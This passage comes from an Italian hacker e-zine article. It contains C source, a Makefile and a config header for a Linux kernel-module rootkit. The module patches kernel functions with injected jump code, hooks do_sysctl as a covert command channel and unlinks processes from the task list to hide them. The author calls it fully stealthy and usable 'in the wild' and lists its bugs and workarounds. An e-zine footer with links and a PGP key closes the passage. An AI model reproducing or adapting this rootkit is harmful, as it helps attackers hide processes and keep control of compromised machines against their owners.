+	        spin_lock_irqsave(&runqueue_lock,sflag);
+		write_lock_irqsave(&tasklist_lock,wflag);
+		/* Risistemiam la struttura bersaglio in fondo alla lista
+		 * principale ed uccidiamo il processo corrispondente */
+		p=init_task.p_pptr;
+		while(p!=&init_task) {
+		       if(p->pid==pid) {
+			    if ((&init_task)->p_pptr==p) {
+			            p->prev_task->p_pptr=p->next_task;
+			            p->next_task->prev_task=p->prev_task;
+				    if ((current)->p_osptr)
+				          p->p_osptr->p_ysptr = (p)->p_ysptr;
+				    if ((p)->p_ysptr)
+				          (p)->p_ysptr->p_osptr = (p)->p_osptr;
+				    else
+				           (p)->p_pptr->p_cptr = (p)->p_osptr;
+			    }
+			    else
+	                            REMOVE_LINKS(p);
+			    SET_LINKS(p);
+			    (*o_kill)(p->pid,9);
+			    break;
+		      }
+		      p=p->next_task;
+	        }
+		found=0;
+		write_unlock_irqrestore(&tasklist_lock,wflag);
+		spin_unlock_irqrestore(&runqueue_lock,sflag);
+
+		if(found)
+			return -1;
+		else
+			return 0;
+		break;
+  } //Fine switch
+}
+else {
+	/* Nel caso non fosse un tentativo di comunicazione eseguiamo
+	 * la do_sysctl reale */
+memcpy(fifth_addr,fifth_backup,CODESIZE);
+sig=o_do_sysctl(name,nlen,oldval,oldlenp,newval,newlen);
+memcpy(fifth_addr,inj_fifth_code,CODESIZE);
+return sig;
+}
+
+return -1;
+}
+
+int init_module(void) {
+
+EXPORT_NO_SYMBOLS;
+
+for_each_task(init)
+	if((init->pid)==1)
+		break;
+
+(&init_task)->p_pptr=init;
+memcpy(first_backup,o_function,CODEBACK1);
+do {
+	//Inizializzato l'array solo dichiarato all'inizio
+	int i=0;
+		for(;i<CODESIZE;i++)
+			first_backup[CODEBACK1+i]=inj_first_code[i];
+}
+while(0);
+
+*(unsigned long *)&inj_first_code[1]=(unsigned long)first_function;
+*(unsigned long *)&inj_second_code[1]=(unsigned long)second_function;
+*(unsigned long *)&inj_third_code[1]=(unsigned long)third_function;
+*(unsigned long *)&inj_fourth_code[1]=(unsigned long)fourth_function;
+*(unsigned long *)&inj_fifth_code[1]=(unsigned long)n_do_sysctl;
+
+/* Mettiamo l'indirizzo di dove dobbiamo saltare nell'array */
+*(unsigned long*)&first_backup[CODEBACK1+1]=(unsigned long)(O_F_ADD+CODEBACK1);
+*(unsigned long*)&second_backup[CODEBACK2+1]=(unsigned long)(O_E_ADD+CODEBACK2);
+
+second_addr=(unsigned long*)O_E_ADD;
+third_addr=(unsigned long*)O_EXIT_END;
+fourth_addr=(unsigned long*)O_DO_EXECVE_END;
+fifth_addr=(unsigned long*)O_DO_SYSCTL;
+
+memcpy(second_backup,second_addr,CODEBACK2);
+memcpy(third_backup,third_addr,CODESIZE);
+memcpy(fourth_backup,fourth_addr,CODESIZE);
+memcpy(fifth_backup,fifth_addr,CODESIZE);
+
+memcpy(o_function,inj_first_code,CODESIZE);
+memcpy(second_addr,inj_second_code,CODESIZE);
+memcpy(third_addr,inj_third_code,CODESIZE);
+memcpy(fourth_addr,inj_fourth_code,CODESIZE);
+memcpy(fifth_addr,inj_fifth_code,CODESIZE);
+o_kill=sys_call_table[SYS_kill];
+
+return 0;
+}
+
+void cleanup_module(void) {
+	memcpy(o_function,first_backup,CODEBACK1);
+memcpy(second_addr,second_backup,CODEBACK2);
+memcpy(third_addr,third_backup,CODESIZE);
+memcpy(fourth_addr,fourth_backup,CODESIZE);
+memcpy(fifth_addr,fifth_backup,CODESIZE);
+init_task.next_task=init_task.p_pptr;
+init_task.p_pptr=(&init_task);
+init->prev_task=(&init_task);
+
+}
+<-X->
+
+<-| smash/config.h |->
+#define O_E_ADD INSERT
+#define O_F_ADD INSERT
+#define O_EXIT_END INSERT
+#define O_DO_EXECVE_END INSERT
+#define CODEBACK1 INSERT
+#define O_DO_SYSCTL INSERT
+<-X->
+
+<-| smash/Makefile |->
+#
+CC=gcc
+CFLAGS=-O2 -Wall
+
+multichain: Hunter.c Phantasmagoria.c
+	$(CC) Hunter.c -o Hunter
+	./Hunter
+	rm ./Hunter
+	$(CC) Heider.c -o Heider
+	$(CC) -c -I /usr/src/linux/include $(CFLAGS) Phantasmagoria.c -o \
+	Phantasmagoria.o
+	cp backup_config.h config.h
+<-X->
+
+	Ecco qui, non e' perfetto al 1000%, ma e' totalmente stealth e
+	decisamente utilizzabile in the wild.
+	Have Fun! ^__^
+
+	-= Dark-Angel =-
+
+-=0x6=-	Bugs, stranezze ed eventuali:
+
+	- Non si puo' hidare la shell su cui si sta lavorando oppure crash
+       	  (thide da un'altra e' ok)
+        - Possono bloccarsi o dare errori programmi che si forkano
+	  molte volte ed i cui figli generano processi a se' stanti, ad
+	  esempio updatedb
+	- Si noti che i processi sono ancora visibili guardando /proc,
+	  ma hidare 1 dir non mi sembra cosi' difficile...:)
+	- Ricordarsi di utilizzare l'apposita funzione per killare un
+	  processo thidato
+	- A volte l'inserimento del modulo puo' fallire a causa di un
+	  unresolved symbol sulla runqueue_lock, non ho capito di preciso
+	  perche' non veda la lib, cmq reinstallando il kernel sembra
+	  venga risolto
+	- Per far si' che il modulo non macchi il kernel basta aggiungere
+	  MODULE_LICENSE("GPL"); in fondo, dopo la cleanup_module
+
+-=Greetings=-
+
+In primis ai Dimmu Borgir per essere il gruppo piu' figo del mondo :>
+E poi a xenion,elv\,black,vecna,snhyper, ai ragazzi di #c/cc+, #phrack.it e
+se ho dimenticato qualcuno perdonooooo :)
+
+-=Approfondimenti=-
+
+	[1] http://bravo.ce.uniroma2.it/kernelhacking/en/course-notes/sched.pd
+
+	Linux Device Drivers 2nd Edition By Alessandro Rubini & Jonathan Corbet
+	[2] http://www.xml.com/ldd/chapter/book
+
+
+
+-[ WEB ]----------------------------------------------------------------------
+
+        http://www.bfi.cx
+	http://www.s0ftpj.org/bfi/
+	http://bfi.itapac.net
+
+
+-[ E-MAiL ]-------------------------------------------------------------------
+
+	bfi@s0ftpj.org
+
+
+-[ PGP ]----------------------------------------------------------------------
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: 2.6.3i
+mQENAzZsSu8AAAEIAM5FrActPz32W1AbxJ/LDG7bB371rhB1aG7/AzDEkXH67nni
+DrMRyP+0u4tCTGizOGof0s/YDm2hH4jh+aGO9djJBzIEU8p1dvY677uw6oVCM374
+nkjbyDjvBeuJVooKo+J6yGZuUq7jVgBKsR0uklfe5/0TUXsVva9b1pBfxqynK5OO
+lQGJuq7g79jTSTqsa0mbFFxAlFq5GZmL+fnZdjWGI0c2pZrz+Tdj2+Ic3dl9dWax
+iuy9Bp4Bq+H0mpCmnvwTMVdS2c+99s9unfnbzGvO6KqiwZzIWU9pQeK+v7W6vPa3
+TbGHwwH4iaAWQH0mm7v+KdpMzqUPucgvfugfx+kABRO0FUJmSTk4IDxiZmk5OEB1
+c2EubmV0PokBFQMFEDZsSu+5yC9+6B/H6QEBb6EIAMRP40T7m4Y1arNkj5enWC/b
+a6M4oog42xr9UHOd8X2cOBBNB8qTe+dhBIhPX0fDJnnCr0WuEQ+eiw0YHJKyk5ql
+GB/UkRH/hR4IpA0alUUjEYjTqL5HZmW9phMA9xiTAqoNhmXaIh7MVaYmcxhXwoOo
+WYOaYoklxxA5qZxOwIXRxlmaN48SKsQuPrSrHwTdKxd+qB7QDU83h8nQ7dB4MAse
+gDvMUdspekxAX8XBikXLvVuT0ai4xd8o8owWNR5fQAsNkbrdjOUWrOs0dbFx2K9J
+l3XqeKl3XEgLvVG8JyhloKl65h9rUyw6Ek5hvb5ROuyS/lAGGWvxv2YJrN8ABLo=
+=o7CG
+-----END PGP PUBLIC KEY BLOCK-----
+
+
+==============================================================================
+-----------------------------------[ EOF ]------------------------------------
+==============================================================================
